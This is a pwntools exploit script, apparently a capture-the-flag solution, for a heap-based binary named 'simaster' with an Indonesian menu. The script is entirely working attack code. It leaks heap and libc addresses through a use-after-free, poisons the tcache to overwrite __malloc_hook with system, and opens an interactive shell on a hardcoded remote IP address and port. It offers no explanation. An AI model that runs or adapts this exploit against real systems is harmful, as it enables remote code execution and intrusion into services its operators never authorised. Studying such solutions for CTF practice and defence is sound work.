from pwn import *

exe = context.binary = ELF(args.EXE or './simaster')
libc = exe.libc

host = args.HOST or '72.62.122.167'
port = int(args.PORT or 5002)

context.log_level = args.LOG or 'info'

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript)
    return process([exe.path] + argv)

def start_remote(argv=[], *a, **kw):
    io = remote(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL or not args.HOST:
        return start_local(argv, *a, **kw)
    return start_remote(argv, *a, **kw)

gdbscript = '''
continue
'''

def numb(x):
    return str(x).encode()

def alloc(size):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Jumlah SKS diambil: ', numb(size))

def free():
    io.sendlineafter(b'> ', b'2')

def edit(num):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Input nilai akhir: ', numb(num))

def show():
    io.sendlineafter(b'> ', b'4')
    io.recvuntil(b'Nilai akhir tercatat: ')
    return int(io.recvline())

def sinkron():
    io.sendlineafter(b'> ', b'5')

io = start()

io.sendline(b'0')

alloc(24)
free()
leak = show()
heap = leak << 12
log.info(f"heap base: 0x{heap:x}")

alloc(24)

alloc(0x440 - 8)
sinkron()
free()
libc.address = show() - (0x72a50d01cc00 - 0x72a50ce3c000)
log.info(f"libc base: 0x{libc.address:x}")

alloc(0x460 - 8)
sinkron()
free()

alloc(0x480 - 8)
sinkron()
free()

alloc(0x420 - 8)
alloc(0x440 - 8)
alloc(0x460 - 8)
sinkron()

alloc(24)
free()

mask = heap >> 12
edit(mask ^ libc.symbols['__malloc_hook'])

alloc(24)
alloc(24)

edit(libc.symbols['system'])
binsh = next(libc.search(b'/bin/sh\x00'))
alloc(binsh)

io.interactive()

